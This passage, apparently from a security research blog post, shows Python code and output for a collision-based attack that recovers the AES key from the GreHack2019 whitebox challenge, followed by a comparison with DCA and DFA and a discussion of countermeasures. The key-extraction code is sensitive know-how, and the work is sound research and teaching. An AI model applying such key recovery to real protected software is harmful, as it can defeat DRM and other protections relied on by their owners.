class=\"p\">):</span>\n    <span class=\"n\">collisions</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"n\">trace</span> <span class=\"ow\">in</span> <span class=\"nb\">enumerate</span><span class=\"p\">(</span><span class=\"n\">traces</span><span class=\"p\">):</span>\n        <span class=\"k\">for</span> <span class=\"n\">pair</span> <span class=\"ow\">in</span> <span class=\"n\">traces</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">:]:</span>\n            <span class=\"k\">if</span> <span class=\"n\">trace</span><span class=\"p\">[</span><span class=\"s1\">'state_e0'</span><span class=\"p\">][</span><span class=\"n\">target_byte</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">pair</span><span class=\"p\">[</span><span class=\"s1\">'state_e0'</span><span class=\"p\">][</span><span class=\"n\">target_byte</span><span class=\"p\">]:</span>\n                <span class=\"n\">collisions</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">({</span><span class=\"s1\">'P0'</span><span class=\"p\">:</span><span class=\"n\">trace</span><span class=\"p\">,</span> <span class=\"s1\">'P1'</span><span class=\"p\">:</span><span class=\"n\">pair</span><span class=\"p\">})</span>\n    <span class=\"k\">return</span> <span class=\"n\">collisions</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">is_colliding</span><span class=\"p\">(</span><span class=\"n\">p0</span><span class=\"p\">,</span> <span class=\"n\">p1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">target_byte</span><span class=\"p\">):</span>\n    <span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">p0</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">p1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"k\">if</span> <span class=\"n\">s0</span><span class=\"p\">[</span><span class=\"n\">target_byte</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">target_byte</span><span class=\"p\">]:</span>\n        <span class=\"k\">return</span> <span class=\"kc\">True</span>\n\n<span class=\"c1\"># Find all keys generating a collision for a given pair of input</span>\n<span class=\"k\">def</span> <span class=\"nf\">find_colliding_keys</span><span class=\"p\">(</span><span class=\"n\">p0</span><span class=\"p\">,</span> <span class=\"n\">p1</span><span class=\"p\">,</span> <span class=\"n\">relationship</span><span class=\"p\">,</span> <span class=\"n\">half</span><span class=\"p\">,</span> <span class=\"n\">target_byte</span><span class=\"p\">):</span>\n    <span class=\"c1\"># Iterate over all the key space, to find one key that generate a collision</span>\n    <span class=\"c1\"># on a plain AES.</span>\n    <span class=\"n\">colliding_keys</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"p\">):</span>\n        <span class=\"k\">for</span> <span class=\"n\">j</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"p\">):</span>\n            <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n            <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"n\">relationship</span><span class=\"p\">[</span><span class=\"s1\">'input_bytes'</span><span class=\"p\">][</span><span class=\"mi\">2</span><span class=\"o\">*</span><span class=\"n\">half</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n            <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"n\">relationship</span><span class=\"p\">[</span><span class=\"s1\">'input_bytes'</span><span class=\"p\">][(</span><span class=\"mi\">2</span><span class=\"o\">*</span><span class=\"n\">half</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">]]</span> <span class=\"o\">=</span> <span class=\"n\">j</span>\n            <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">key</span><span class=\"p\">[::</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n\n            <span class=\"k\">if</span> <span class=\"n\">is_colliding</span><span class=\"p\">(</span><span class=\"n\">p0</span><span class=\"p\">,</span> <span class=\"n\">p1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">target_byte</span><span class=\"p\">):</span>\n                <span class=\"n\">colliding_keys</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"k\">return</span> <span class=\"n\">colliding_keys</span>\n</pre> \n  </div> \n  <p>Once we managed to recover a few pairs of colliding plaintexts, we can start recovering the key. The algorithm is quite simple, we take a first pair of plaintexts, compute all the potential keys and keep the ones generating a collision. We then test those keys against a new pair of plaintexts, and keep only the keys that also generated a collision for this pair. (And we go on, until a single key is left.)</p> \n  <p>Below is the attack demonstrated, and the recovery of the whitebox key:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">def</span> <span class=\"nf\">break_subkey</span><span class=\"p\">(</span><span class=\"n\">traces</span><span class=\"p\">,</span> <span class=\"n\">relationship</span><span class=\"p\">,</span> <span class=\"n\">half</span><span class=\"p\">):</span>\n    <span class=\"n\">target_byte</span> <span class=\"o\">=</span> <span class=\"n\">relationship</span><span class=\"p\">[</span><span class=\"s2\">\"affected_bytes\"</span><span class=\"p\">][</span><span class=\"mi\">0</span><span class=\"p\">]</span>\n    <span class=\"n\">collisions</span> <span class=\"o\">=</span> <span class=\"n\">find_collisions</span><span class=\"p\">(</span><span class=\"n\">traces</span><span class=\"p\">,</span> <span class=\"n\">target_byte</span><span class=\"p\">)</span>\n    <span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"n\">collisions</span><span class=\"p\">:</span>\n        <span class=\"c1\"># Compute all the keys for the first pair of plaintexts</span>\n        <span class=\"k\">if</span> <span class=\"ow\">not</span> <span class=\"n\">pk</span><span class=\"p\">:</span>\n            <span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"n\">find_colliding_keys</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">[</span><span class=\"s1\">'P0'</span><span class=\"p\">][</span><span class=\"s1\">'input_data'</span><span class=\"p\">],</span> <span class=\"n\">i</span><span class=\"p\">[</span><span class=\"s1\">'P1'</span><span class=\"p\">][</span><span class=\"s1\">'input_data'</span><span class=\"p\">],</span>\n                                     <span class=\"n\">relationship</span><span class=\"p\">,</span> <span class=\"n\">half</span><span class=\"p\">,</span> <span class=\"n\">target_byte</span><span class=\"p\">)</span>\n        <span class=\"c1\"># Test those keys against the other pairs and keep only the colliding ones</span>\n        <span class=\"k\">else</span><span class=\"p\">:</span>\n            <span class=\"n\">left_keys</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n            <span class=\"k\">for</span> <span class=\"n\">k</span> <span class=\"ow\">in</span> <span class=\"n\">pk</span><span class=\"p\">:</span>\n                <span class=\"k\">if</span> <span class=\"n\">is_colliding</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">[</span><span class=\"s1\">'P0'</span><span class=\"p\">][</span><span class=\"s1\">'input_data'</span><span class=\"p\">],</span> <span class=\"n\">i</span><span class=\"p\">[</span><span class=\"s1\">'P1'</span><span class=\"p\">][</span><span class=\"s1\">'input_data'</span><span class=\"p\">],</span> <span class=\"n\">k</span><span class=\"p\">,</span> <span class=\"n\">target_byte</span><span class=\"p\">):</span>\n                    <span class=\"n\">left_keys</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">(</span><span class=\"n\">k</span><span class=\"p\">)</span>\n            <span class=\"n\">pk</span> <span class=\"o\">=</span> <span class=\"n\">left_keys</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">pk</span><span class=\"o\">.</span><span class=\"n\">pop</span><span class=\"p\">()</span>\n\n<span class=\"n\">final_key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"k\">for</span> <span class=\"n\">block</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">4</span><span class=\"p\">):</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Breaking half-0 of block </span><span class=\"si\">{block}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n    <span class=\"n\">subkey_0</span> <span class=\"o\">=</span> <span class=\"n\">break_subkey</span><span class=\"p\">(</span><span class=\"n\">traces_half0</span><span class=\"p\">,</span> <span class=\"n\">RELATIONSHIP</span><span class=\"p\">[</span><span class=\"n\">block</span><span class=\"p\">],</span> <span class=\"mi\">0</span><span class=\"p\">)</span>\n\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Subkey found is </span><span class=\"si\">{subkey_0}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Breaking half-1 of block </span><span class=\"si\">{block}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n    <span class=\"n\">subkey_1</span> <span class=\"o\">=</span> <span class=\"n\">break_subkey</span><span class=\"p\">(</span><span class=\"n\">traces_half1</span><span class=\"p\">,</span> <span class=\"n\">RELATIONSHIP</span><span class=\"p\">[</span><span class=\"n\">block</span><span class=\"p\">],</span> <span class=\"mi\">1</span><span class=\"p\">)</span>\n\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Subkey found is </span><span class=\"si\">{subkey_1}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n\n    <span class=\"c1\"># subkeys are null except on bytes of interest, so we can XOR them</span>\n    <span class=\"n\">final_key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"n\">final_key</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">^</span> <span class=\"n\">subkey_0</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)]</span>\n    <span class=\"n\">final_key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"n\">final_key</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">^</span> <span class=\"n\">subkey_1</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">16</span><span class=\"p\">)]</span>\n    <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"-\"</span><span class=\"o\">*</span><span class=\"mi\">80</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Final key recovered : { bytes(final_key)}\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nBreaking half-0 of block 0\nSubkey found is [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 115, 0, 0, 0, 0, 125]\nBreaking half-1 of block 0\nSubkey found is [71, 0, 0, 0, 0, 65, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n--------------------------------------------------------------------------------\nBreaking half-0 of block 1\nSubkey found is [0, 0, 0, 0, 0, 0, 0, 0, 0, 105, 0, 0, 0, 0, 78, 0]\nBreaking half-1 of block 1\nSubkey found is [0, 0, 0, 57, 123, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n--------------------------------------------------------------------------------\nBreaking half-0 of block 2\nSubkey found is [0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 85, 0, 0]\nBreaking half-1 of block 2\nSubkey found is [0, 0, 49, 0, 0, 0, 0, 83, 0, 0, 0, 0, 0, 0, 0, 0]\n--------------------------------------------------------------------------------\nBreaking half-0 of block 3\nSubkey found is [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 70, 0, 0, 0]\nBreaking half-1 of block 3\nSubkey found is [0, 72, 0, 0, 0, 0, 69, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n--------------------------------------------------------------------------------\nFinal key recovered : b'GH19{AES is FUN}'\n</pre> \n  <p>The key we recovered is <strong>GH19{AES is FUN}</strong>, which seems like the good one! We tested this attack against a few other whiteboxes, and it worked pretty well. Other attacks like DCA and DFA on round 8 (because the last rounds are protected) would also have worked here and are generally really efficient (see <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id32\" id=\"id20\">[10]</a> and <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id33\" id=\"id21\">[11]</a> for the attacks).</p> \n  <div class=\"figure\"> \n   <img alt=\"Goupix-whitebox\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/goupix-wb.jpg\" style=\"width: 380.0px; height: 506.16px;\" /> \n  </div> \n  <p>There are a few differences between all those attacks, DCA is based on a statistical approach, so it might fail, on one or two key bytes, requiring a quick brute force or a second run to succeed. DFA attacks require to fault the good section of the tables in order to be efficient.</p> \n  <p>With this collision-based attack, we just have to target the input that we control, and since there are no statistics involved, the success rate is 100%.</p> \n  <p>However, I am not saying this attack is better (it is not). It has its downside, for instance, you need to be able to observe the end of round 0, which might not always be easy if the whitebox is obfuscated (where it is easier with DFA, since you are observing the output of AES). Yet, this attack is interesting, because it does not require a lot of mathematical, cryptographic or reversing background to get it working.</p> \n  <p>And like for DFA and DCA, a whitebox can be built to be protected against this attack. For instance, I believe that large encodings would render the attack unusable (I haven't tested it though). Also note that obfuscation can also be another layer of protection against this kind of attacks.</p> \n </div> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>This post was mostly written to share my thought process and journey from zero-knowledge about whiteboxes, to breaking a few of them (among which the GreHack2019 whitebox <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id32\" id=\"id22\">[10]</a>). Hopefully, it will help some of you to get into the subject, that in the end, is not so unreachable. Also, it puts the light on another usage of QBDI for cryptanalysis, which is one of the many usages of DBI frameworks.</p> \n <p>Sadly, for the hardcore reversers or equation-lovers, you might not have found what you were looking for, but feel free to send us a custom whitebox, that I would be happy to attack and write about :).</p> \n <p>Sorry for the long post, here is a potato: 🥔</p> \n</div> \n<div class=\"section\" id=\"acknowledgments\"> \n <h2>Acknowledgments</h2> \n <p>Thanks to all my Quarkslab colleagues who discussed and proofread this article. More specifically, many thanks to Matthieu, Adrien, Marion and Philippe who took the time to share their knowledge about whiteboxes and discuss about them with me.</p> \n <table class=\"docutils citation\" frame=\"void\" id=\"qbdi\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id1\">[QBDI]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/QBDI/QBDI/\">https://github.com/QBDI/QBDI/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"drm\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id6\">[DRM]</a></td> \n    <td><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Digital_rights_management\">https://en.wikipedia.org/wiki/Digital_rights_management</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"aes\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id7\">[AES]</a></td> \n    <td><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Advanced_Encryption_Standard\">https://en.wikipedia.org/wiki/Advanced_Encryption_Standard</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id23\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id2\">[1]</a></td> \n    <td><a class=\"reference external\" href=\"https://eprint.iacr.org/2015/753.pdf\">https://eprint.iacr.org/2015/753.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id24\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[2]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id3\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id11\">2</a>)</em> <a class=\"reference external\" href=\"https://www.riscure.com/uploads/2017/09/eu-15-sanfelix-mune-dehaas-unboxing-the-white-box-wp_v1.1.pdf\">https://www.riscure.com/uploads/2017/09/eu-15-sanfelix-mune-dehaas-unboxing-the-white-box-wp_v1.1.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id25\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id4\">[3]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.slideshare.net/codeblue_jp/key-recovery-attacks-against-commercial-whitebox-cryptography-implementations-by-sanghwan-ahn\">https://www.slideshare.net/codeblue_jp/key-recovery-attacks-against-commercial-whitebox-cryptography-implementations-by-sanghwan-ahn</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id26\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id5\">[4]</a></td> \n    <td><a class=\"reference external\" href=\"https://connect.ed-diamond.com/MISC/MISCHS-005/Cryptographie-en-boite-blanche-cacher-des-cles-dans-du-logiciel\">https://connect.ed-diamond.com/MISC/MISCHS-005/Cryptographie-en-boite-blanche-cacher-des-cles-dans-du-logiciel</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id27\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[5]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id10\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id15\">2</a>)</em> <a class=\"reference external\" href=\"https://link.springer.com/content/pdf/10.1007/3-540-36492-7_17.pdf\">https://link.springer.com/content/pdf/10.1007/3-540-36492-7_17.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id28\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id12\">[6]</a></td> \n    <td><a class=\"reference external\" href=\"https://eprint.iacr.org/2017/355.pdf\">https://eprint.iacr.org/2017/355.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id29\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id13\">[7]</a></td> \n    <td><a class=\"reference external\" href=\"https://blog.quarkslab.com/differential-fault-analysis-on-white-box-aes-implementations.html\">https://blog.quarkslab.com/differential-fault-analysis-on-white-box-aes-implementations.html</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id30\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id14\">[8]</a></td> \n    <td><a class=\"reference external\" href=\"https://eprint.iacr.org/2019/076.pdf\">https://eprint.iacr.org/2019/076.pdf</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id31\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id16\">[9]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/SideChannelMarvels/Deadpool\">https://github.com/SideChannelMarvels/Deadpool</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id32\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[10]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id17\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id20\">2</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id22\">3</a>)</em> <a class=\"reference external\" href=\"https://github.com/SideChannelMarvels/Deadpool/tree/master/wbs_aes_grehack2019\">https://github.com/SideChannelMarvels/Deadpool/tree/master/wbs_aes_grehack2019</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id33\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\">[11]</td> \n    <td><em>(<a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id18\">1</a>, <a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id21\">2</a>)</em> <a class=\"reference external\" href=\"https://gist.github.com/nreboud/863b9e49b5584cc6d6bea8f13aab3e05\">https://gist.github.com/nreboud/863b9e49b5584cc6d6bea8f13aab3e05</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id34\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id19\">[12]</a></td> \n    <td><a class=\"reference external\" href=\"https://qbdi.quarkslab.com/\">https://qbdi.quarkslab.com/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"aes-round\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id8\">[AES_round]</a></td> \n    <td><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/Advanced_Encryption_Standard#High-level_description_of_the_algorithm\">https://en.wikipedia.org/wiki/Advanced_Encryption_Standard#High-level_description_of_the_algorithm</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils citation\" frame=\"void\" id=\"phoenixaes\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/introduction-to-whiteboxes-and-collision-based-attacks-with-qbdi.html#id9\">[PhoenixAES]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/SideChannelMarvels/JeanGrey/tree/master/phoenixAES\">https://github.com/SideChannelMarvels/JeanGrey/tree/master/phoenixAES</a></td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<script type=\"text/javascript\">if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width &lt; 768) ? \"left\" : align; indent = (screen.width &lt; 768) ? \"0em\" : indent; linebreak = (screen.width &lt; 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML'; mathjaxscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript); } </script>","descriptionType":"html","publishedDate":"Mon, 17 Aug 2020 22:00:00 